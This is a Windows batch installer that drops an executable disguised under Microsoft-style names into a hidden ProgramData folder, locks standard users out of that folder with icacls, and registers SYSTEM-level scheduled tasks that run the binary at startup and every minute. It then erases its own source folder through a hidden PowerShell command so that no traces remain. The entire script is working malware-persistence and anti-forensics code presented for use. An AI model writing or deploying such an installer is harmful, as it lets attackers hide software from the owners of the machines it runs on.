@echo off
setlocal

:: Target: Built-in Windows ProgramData System directory
set "TARGET_DIR=%ProgramData%\Microsoft\Crypto\SystemBroker"
set "EXE_NAME=RuntimeBrokerHost.exe"
set "SOURCE_DIR=%~dp0"

:: 1. Create hidden target directory
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: 2. Copy the single self-contained binary (Embedded Config inside)
copy /Y "%SOURCE_DIR%%EXE_NAME%" "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: 3. Set Super-Hidden (+h +s: Protected OS System File)
attrib +h +s "%TARGET_DIR%" >nul 2>&1
attrib +h +s "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: 4. Lock NTFS Permissions (ANTI-DELETE & ANTI-OPEN-LOCATION)
:: SYSTEM and Administrators have Full Control.
:: Standard Users are DENIED all access (If they click "Open file location", Explorer says "Access is Denied"!)
icacls "%TARGET_DIR%" /inheritance:r /grant:r "SYSTEM":(OI)(CI)F /grant:r "Administrators":(OI)(CI)F /deny Users:(OI)(CI)F >nul 2>&1

:: 5. Register Task strictly under NT AUTHORITY\SYSTEM
schtasks /create /tn "Microsoft\Windows\Runtime\SystemBrokerHost" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc onstart /ru "NT AUTHORITY\SYSTEM" /rl highest /f >nul 2>&1

:: 6. Continuous 1-Minute Heartbeat / Auto-Rerun under SYSTEM
schtasks /create /tn "Microsoft\Windows\Runtime\SystemBrokerHost_Heartbeat" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc minute /mo 1 /ru "NT AUTHORITY\SYSTEM" /rl highest /f >nul 2>&1

:: 7. Launch immediately under SYSTEM
schtasks /run /tn "Microsoft\Windows\Runtime\SystemBrokerHost" >nul 2>&1

:: 8. Self-Destruct / Clean up original installation files (Leave ZERO traces)
:: Uses background PowerShell to cleanly delete the source folder 2 seconds after exit!
start "" /b powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -Path '%SOURCE_DIR:~0,-1%' -Recurse -Force"

endlocal
exit
